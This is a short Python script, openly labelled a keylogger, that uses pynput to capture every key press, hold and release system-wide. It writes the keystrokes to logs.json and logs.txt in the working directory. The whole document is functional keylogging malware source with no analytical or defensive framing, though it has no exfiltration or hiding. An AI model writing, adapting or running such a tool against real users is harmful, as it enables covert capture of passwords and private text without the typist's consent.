from pynput import keyboard
import json

key_list = []
x = False
key_strokes = ""

def update_txt_file(text):
    
    with open('logs.txt', 'a', encoding='utf-8') as f:
        f.write(text)

def update_json_file(key_list):
    with open('logs.json', 'w', encoding='utf-8') as f:
        json.dump(key_list, f)

def on_press(key):
    global x, key_list
    if not x:
        key_list.append({"pressed": f'{key}'})
        x = True
    else:
        key_list.append({"hold": f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({"released": f'{key}'})
    if x:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes) + "\n")

print("[+] Running keylogger; saving logs in logs.json and logs.txt")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()
